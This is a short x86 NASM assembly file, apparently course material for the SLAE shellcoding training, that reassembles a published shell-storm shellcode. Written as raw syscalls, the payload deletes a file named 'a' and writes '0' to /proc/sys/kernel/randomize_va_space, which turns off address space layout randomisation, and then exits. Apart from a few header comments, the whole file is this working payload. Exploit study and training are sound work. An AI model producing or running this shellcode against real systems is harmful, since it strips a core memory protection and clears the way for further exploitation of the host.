; Filename: original-617.nasm
; Author: Konstantinos Alexiou
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
; Desc:  Assembly of http://shell-storm.org/shellcode/files/shellcode-617.php 
; Purpose: SLAE

global _start

section .text
_start:


	 xor ebx,ebx
	 push byte +0x61
	 mov ebx,esp
	 mov al,0xa
	 int 0x80
	 xor ebx,ebx
	 push byte +0x65
	 push word 0x6361
	 push dword 0x70735f61
	 push dword 0x765f657a
	 push dword 0x696d6f64
	 push dword 0x6e61722f
	 push dword 0x6c656e72
	 push dword 0x656b2f73
	 push dword 0x79732f63
	 push dword 0x6f72702f
	 mov ebx,esp
	 xor al,al
	 mov al,0x11
	 xor ecx,ecx
	 mov cx,0x441
	 xor edx,edx
	 mov dx,0x1a4
	 xor eax,eax
	 mov al,0x5
	 int 0x80
	 mov ebx,eax
	 xor ecx,ecx
	 push word 0xa30
	 mov ecx,esp
	 xor edx,edx
	 mov dl,0x2
	 xor eax,eax
	 mov al,0x4
	 int 0x80
	 mov al,0x1
	 int 0x80
